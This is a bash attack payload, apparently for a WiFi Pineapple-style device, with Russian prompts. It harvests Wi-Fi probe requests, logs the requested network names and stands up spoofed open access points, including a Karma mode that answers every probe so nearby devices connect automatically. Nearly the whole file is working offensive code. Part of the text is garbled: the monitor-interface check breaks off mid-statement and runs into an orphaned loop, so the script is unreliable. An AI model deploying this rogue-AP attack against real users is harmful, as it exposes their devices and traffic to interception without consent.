#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Атака Probe
# Author: NullSec
# Description: Использует probe-запросы для приманки клиентов с помощью имитации точек доступа
# Category: nullsec/attack

# Автоматически определяет правильный беспроводной интерфейс (экспортирует $IFACE).
# При отсутствии интерфейса показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/probeattack"
mkdir -p "$LOOT_DIR"

PROMPT "АТАКА PROBE

Захватывайте probe-запросы
и создавайте совпадающие AP
для приманивания клиентов.

Особенности:
- Захват probe-запросов
- Автоматическое создание AP
- Лог подключений клиентов
- Сбор SSID
- Поведение в стиле Karma

ПРЕДУПРЕЖДЕНИЕ: Активная атака.

Нажмите ОК для настройки."

# Check dependencies
MISSING=""
command -v airodump-ng >/dev/null 2>&1 || MISSING="${MISSING}aircrack-ng "
command -v hostapd >/dev/null 2>&1 || command -v hostapd-mana >/dev/null 2>&1 || MISSING="${MISSING}hostapd "

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Отсутствуют инструменты: $MISSING

Установите через opkg."
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
 done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Интерфейс мониторинга не найден!
    [ -d "/sys/class/net/$iface" ] && AP_IFACE="$iface" && break
done
[ -z "$AP_IFACE" ] && AP_IFACE="$IFACE"

PROMPT "РЕЖИМ АТАКИ:

1. Пассивный сбор probe
2. Создание целевого AP
3. Массовый AP (топ probe)
4. Karma (отвечать всем)

Монитор: $MONITOR_IF
AP-интерфейс: $AP_IFACE

Выберите режим далее."

ATTACK_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac

SCAN_DURATION=$(NUMBER_PICKER "Время сканирования (сек):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ПРОБЕ АТАКУ?

Режим: $ATTACK_MODE
Скан: ${SCAN_DURATION}s
Монитор: $MONITOR_IF
AP: $AP_IFACE

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
PROBE_LOG="$LOOT_DIR/probes_$TIMESTAMP.log"
CLIENT_LOG="$LOOT_DIR/clients_$TIMESTAMP.log"

# Phase 1: Capture probe requests
LOG "Захват probe-запросов..."
SPINNER_START "Прослушивание probe..."

PROBE_FILE="/tmp/probes_$$"
timeout "$SCAN_DURATION" tcpdump -i "$MONITOR_IF" -e -s 256 type mgt subtype probe-req 2>/dev/null | \
    grep -oE "Probe Request \(.*\)" | sed 's/Probe Request (\(.*\))/\1/' | sort | uniq -c | sort -rn > "$PROBE_FILE"

# Also capture with airodump if possible
AIRODUMP_CSV="/tmp/airodump_$$"
timeout "$SCAN_DURATION" airodump-ng "$MONITOR_IF" --output-format csv -w "$AIRODUMP_CSV" 2>/dev/null &
AIRO_PID=$!
sleep "$SCAN_DURATION"
kill $AIRO_PID 2>/dev/null

SPINNER_STOP

PROBE_COUNT=$(wc -l < "$PROBE_FILE" 2>/dev/null | tr -d ' ')
TOP_PROBES=$(head -10 "$PROBE_FILE")

# Save probe log
cp "$PROBE_FILE" "$PROBE_LOG"

PROMPT "ЗАХВАЧЕНО PROBES: $PROBE_COUNT

Топ запрашиваемых SSID:
$TOP_PROBES

Нажмите ОК для продолжения."

case $ATTACK_MODE in
    1) # Passive harvest only
        PROMPT "СБОР PROBE ЗАВЕРШЕН

Захвачено $PROBE_COUNT
уникальных SSID из
probe-запросов клиентов.

Сохранено: $PROBE_LOG

Нажмите ОК для выхода."
        ;;

    2) # Targeted AP creation
        TARGET_SSID=$(TEXT_PICKER "SSID для подмены:" "$(head -1 "$PROBE_FILE" | awk '{$1=""; print}' | xargs)")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

        SPINNER_START "Создание поддельного AP..."

        # Configure hostapd
        HOSTAPD_CONF="/tmp/probe_hostapd_$$.conf"
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$TARGET_SSID
channel=6
hw_mode=g
auth_algs=1
wmm_enabled=0
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "ПОДДЕЛЬНЫЙ AP АКТИВЕН

SSID: $TARGET_SSID
Интерфейс: $AP_IFACE

Ожидание подключения
клиентов...

Нажмите ОК, чтобы остановить."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    3) # Mass AP - top probed SSIDs
        MAX_APS=$(NUMBER_PICKER "Макс. AP (1-5):" 3)
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_APS=3 ;; esac

        SPINNER_START "Создание нескольких AP..."

        HOSTAPD_CONF="/tmp/probe_mass_$$.conf"
        SSID_LIST=""
        COUNT=0

        while IFS= read -r line && [ $COUNT -lt $MAX_APS ]; do
            SSID=$(echo "$line" | awk '{$1=""; print}' | xargs)
            [ -z "$SSID" ] && continue
            SSID_LIST="${SSID_LIST}${SSID}\n"
            COUNT=$((COUNT + 1))
        done < "$PROBE_FILE"

        # Use first SSID for single AP (multi-SSID requires special setup)
        FIRST_SSID=$(echo -e "$SSID_LIST" | head -1)
        cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
ssid=$FIRST_SSID
channel=6
hw_mode=g
auth_algs=1
EOF
        hostapd "$HOSTAPD_CONF" -B 2>/dev/null
        HOSTAPD_PID=$!
        SPINNER_STOP

        PROMPT "МАССОВЫЙ AP АКТИВЕН

Транслируются SSID:
$(echo -e "$SSID_LIST" | head -5)

Ожидание клиентов...

Нажмите ОК, чтобы остановить."

        kill $HOSTAPD_PID 2>/dev/null
        rm -f "$HOSTAPD_CONF"
        ;;

    4) # Karma mode
        SPINNER_START "Запуск Karma-атаки..."

        if command -v hostapd-mana >/dev/null 2>&1; then
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
enable_karma=1
karma_loud=1
EOF
            hostapd-mana "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        else
            # Fallback: create open AP with common SSID
            KARMA_CONF="/tmp/karma_$$.conf"
            cat > "$KARMA_CONF" << EOF
interface=$AP_IFACE
ssid=FreeWiFi
channel=6
hw_mode=g
auth_algs=1
EOF
            hostapd "$KARMA_CONF" -B 2>/dev/null
            KARMA_PID=$!
        fi
        SPINNER_STOP

        PROMPT "KARMA-АТАКА АКТИВНА

Отвечаем на все
probe-запросы.

Клиенты автоматически
подключатся к нашему AP.

Нажмите ОК, чтобы остановить."

        kill $KARMA_PID 2>/dev/null
        rm -f "$KARMA_CONF"
        ;;
esac

# Cleanup
rm -f "$PROBE_FILE" "${AIRODUMP_CSV}"*

PROMPT "АТАКА PROBE ЗАВЕРШЕНА

Probe-запросов собрано: $PROBE_COUNT
Логи сохранены:
$LOOT_DIR/

Нажмите ОК для выхода."
